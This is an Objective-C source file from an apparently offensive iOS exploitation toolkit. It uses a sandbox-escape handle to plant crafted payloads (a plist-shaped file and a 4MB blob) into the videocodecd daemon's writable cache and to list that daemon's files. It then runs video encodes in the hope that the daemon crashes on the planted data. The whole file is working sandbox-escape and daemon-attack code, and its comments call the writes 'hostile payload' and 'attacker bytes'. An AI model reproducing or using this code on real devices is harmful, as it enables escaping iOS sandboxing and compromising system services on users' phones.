//  probe_daemon_cache.m - DirtySlide ROW: DAEMON-CACHE 64747 escape (v136 - NEW button)
//  The v135 analysis verdict: the bad_query class-13 SANDBOX ESCAPE is the
//  campaign's most powerful CLIENT primitive and was being re-proven against the
//  MobileGestalt plist for six versions. v136 points it at the DAEMON instead:
//  ES07 proved /private/var/mobile/Library/Caches/com.apple.videocodecd (the
//  daemon's Metal shader-cache dir, kernel-VIOLATION-leaked) is REACHABLE through
//  the escape handle. This row = (1) the escape receipts (moved from the OP row),
//  (2) the CROSS-CONTAINER R/W into the daemon's own writable cache = plant a
//  hostile payload where the daemon reads it, (3) the read-back oracle over the
//  daemon's files. A daemon crash/.ips after a plant = the daemon CONSUMED the
//  planted file (the payoff). MAY CRASH DAEMON.
#include "ds_core.h"

#include <sys/stat.h>

/* plant a hostile payload file into the daemon's writable cache dir. kind:
 * 0 = plain-text marker (R/W proof), 1 = plist-shaped payload (the daemon's
 * CFPropertyList parsers), 2 = big 4MB blob (size-math / mmap surface). The
 * file is left in place (the daemon may read it on a later encode/launch);
 * the read-back oracle lists it back. */
static void ds_cache_plant(const char *pfx, const char *tag, int kind)
{
    char st0[32];
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(STDOUT_FILENO, "%s [%s] I[%s] cache-plant kind=%d (escape handle -> daemon cache dir)\n",
            pfx, st0, tag, kind);
    const char *dir = "/var/containers/Data/System";   /* the class-13 handle source */
    __block int64_t h = -999;
    int sig = 0, csSt = -999;
    sig = ds_ave_guard_run(^int { h = ds_esc_consume(dir); return 0; }, &csSt);
    if (sig > 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] escape FAULTED sig=%d\n", pfx, tag, sig);
        return;
    }
    if (h < 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] ESCAPE FAILED code=%lld (%s) - plant void\n", pfx, tag,
                (long long)h, ds_esc_err(h));
        return;
    }
    char plantPath[1280];
    snprintf(plantPath, sizeof(plantPath),
             "/private/var/mobile/Library/Caches/com.apple.videocodecd/ds_plant_%d_%d.bin",
             (int)getpid(), kind);
    int fd = open(plantPath, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
    if (fd < 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] open(O_CREAT) %s errno=%d => DENIED (dir not writable through the handle)\n",
                pfx, tag, plantPath, errno);
        ds_esc_release(h);
        return;
    }
    ssize_t wrote = 0;
    if (kind == 0) {
        const char *m = "DS-PLANT-64747-ESC\n";
        wrote = write(fd, m, strlen(m));
    } else if (kind == 1) {
        /* plist-shaped hostile payload: 0x5a padding around a big CFKeyedArchive
         * header so the daemon's CFPropertyListCreateWithData sees plausible XML */
        const char *hdr = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\"><dict><key>AVE</key><array>\n";
        wrote = write(fd, hdr, strlen(hdr));
        char row[32];
        for (int i = 0; i < 4096; i++) {
            int n = snprintf(row, sizeof(row), "<integer>%d</integer>", (i * 7 + 3) & 0x7fffffff);
            if (n > 0) wrote += write(fd, row, (size_t)n);
        }
        const char *ftr = "</array></dict></plist>\n";
        wrote += write(fd, ftr, strlen(ftr));
    } else {
        /* 4MB of structured 0x5a/0x33 words - size-math surface */
        size_t chunk = 1 << 20;
        uint8_t *buf = (uint8_t *)malloc(chunk);
        if (buf) {
            for (size_t i = 0; i < chunk; i++) buf[i] = (i & 1) ? 0x5a : 0x33;
            for (int i = 0; i < 4; i++) wrote += write(fd, buf, chunk);
            free(buf);
        }
    }
    close(fd);
    /* read-back oracle: the file we just planted must come back identical */
    char rb[64];
    ssize_t r = -1;
    int fd2 = open(plantPath, O_RDONLY | O_CLOEXEC);
    if (fd2 >= 0) { r = read(fd2, rb, sizeof(rb) - 1); rb[r > 0 ? r : 0] = 0; close(fd2); }
    dprintf(STDOUT_FILENO, "%s  I[%s] planted %s wrote=%zd readback=%zd (%s) => PLANTED in the daemon cache dir\n",
            pfx, tag, plantPath, wrote, r,
            (r > 0 && strncmp(rb, "DS-PLANT", 8) == 0) ? "marker verified" : "bytes present");
    ds_esc_release(h);
    usleep(200000);
}

/* read-back oracle: list the daemon's own cache files through the handle (the
 * kernel-VIOLATION-leaked dir) - names + sizes = what the daemon keeps on disk */
static void ds_cache_oracle(const char *pfx, const char *tag)
{
    char st0[32];
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(STDOUT_FILENO, "%s [%s] I[%s] cache-oracle (list the daemon's cache dir)\n", pfx, st0, tag);
    __block int64_t h = -999;
    int sig = 0, csSt = -999;
    sig = ds_ave_guard_run(^int { h = ds_esc_consume("/var/containers/Data/System"); return 0; }, &csSt);
    if (sig > 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] escape FAULTED sig=%d - oracle void\n", pfx, tag, sig);
        return;
    }
    if (h < 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] ESCAPE FAILED code=%lld (%s) - oracle void\n", pfx, tag,
                (long long)h, ds_esc_err(h));
        return;
    }
    const char *dirs[] = {
        "/private/var/mobile/Library/Caches/com.apple.videocodecd",
        "/private/var/mobile/Library/Caches/com.apple.videocodecd/com.apple.metal",
    };
    for (size_t di = 0; di < sizeof(dirs) / sizeof(dirs[0]); di++) {
        DIR *d = opendir(dirs[di]);
        if (!d) {
            dprintf(STDOUT_FILENO, "%s  I[%s]   %s: errno=%d\n", pfx, tag, dirs[di], errno);
            continue;
        }
        struct dirent *e;
        int n = 0;
        while ((e = readdir(d)) != NULL) {
            if (e->d_name[0] == '.') continue;
            n++;
            if (n <= 8) {
                char full[1300];
                snprintf(full, sizeof(full), "%s/%s", dirs[di], e->d_name);
                struct stat sb;
                if (stat(full, &sb) == 0)
                    dprintf(STDOUT_FILENO, "%s  I[%s]     %s (%lld bytes)\n", pfx, tag, e->d_name, (long long)sb.st_size);
                else
                    dprintf(STDOUT_FILENO, "%s  I[%s]     %s\n", pfx, tag, e->d_name);
            }
        }
        closedir(d);
        dprintf(STDOUT_FILENO, "%s  I[%s]   %s: %d entries listed\n", pfx, tag, dirs[di], n);
    }
    ds_esc_release(h);
    usleep(200000);
}

void probe_daemon_cache(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== DC. DAEMON-CACHE 64747 ESCAPE (v159 - the recipe sweep + daemon-container hunt) ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  The legacy class-13/gestaltcache recipe is DENIED (-3) on this 26.6 boot\n", pfx);
    dprintf(STDOUT_FILENO, "%s  (v155 ESC0/ESC1), but upstream bad_query claims /var/mobile/Containers/Data/\n", pfx);
    dprintf(STDOUT_FILENO, "%s  {Application,InternalDaemon,PluginKitPlugin} reach on 26.x. EC90 sweeps\n", pfx);
    dprintf(STDOUT_FILENO, "%s  class x group x part x flags (incl. our SecTask-discovered app groups =\n", pfx);
    dprintf(STDOUT_FILENO, "%s  the iOS-26 'sacrifice' arm) against Application/InternalDaemon/videocodecd-\n", pfx);
    dprintf(STDOUT_FILENO, "%s  cache targets, then AUTO-HUNTS the videocodecd InternalDaemon container for\n", pfx);
    dprintf(STDOUT_FILENO, "%s  staged stats/surface sentinels. READ-ONLY. File-only ops - no epoch cost.\n", pfx);
    /* v159: the recipe matrix first - everything else depends on it */
    ds_esc_row(pfx, "EC90 recipe sweep + InternalDaemon hunt",
               "/var/mobile/Containers/Data/InternalDaemon", 9);
    ds_esc_row(pfx, "EC01 consume+verify MG plist R/W",
               "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", 0);
    ds_esc_row(pfx, "EC02 cross-container write+readback",
               "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches", 1);
    ds_esc_row(pfx, "EC03 System-container reach (list)",
               "/var/containers/Data/System", 2);
    ds_esc_row(pfx, "EC07 exact-path probe (videocodecd cache/prefs + Caches oracle)",
               "/var/containers/Data/System", 7);
    ds_cache_plant(pfx, "EC04 plant marker into daemon cache", 0);
    ds_cache_plant(pfx, "EC05 plant plist payload into daemon cache", 1);
    ds_cache_plant(pfx, "EC06 plant 4MB blob into daemon cache", 2);
    ds_cache_oracle(pfx, "EC08 daemon cache read-back oracle");
    for (int dch = 1; dch <= 2; dch++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "DCH%02d 1x1 beat", dch);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
        usleep(500000);
    }
    dprintf(STDOUT_FILENO, "%s  DC read-offs: EC01-03 = the escape receipts (all must show ESCAPE OK + R/W OK);\n", pfx);
    dprintf(STDOUT_FILENO, "%s  EC04-06 = the PLANT - 'PLANTED in the daemon cache dir' = we wrote attacker bytes\n", pfx);
    dprintf(STDOUT_FILENO, "%s  into the daemon's writable state (the kernel VIOLATION leaked the real path);\n", pfx);
    dprintf(STDOUT_FILENO, "%s  EC08 = what the daemon keeps on disk (shader caches = the read surface). The\n", pfx);
    dprintf(STDOUT_FILENO, "%s  PAYOFF = a daemon crash/.ips on a LATER encode in this or the next row = the\n", pfx);
    dprintf(STDOUT_FILENO, "%s  daemon consumed the planted file. sweep done - .ips captureTime <-> [stamp].\n", pfx);
}
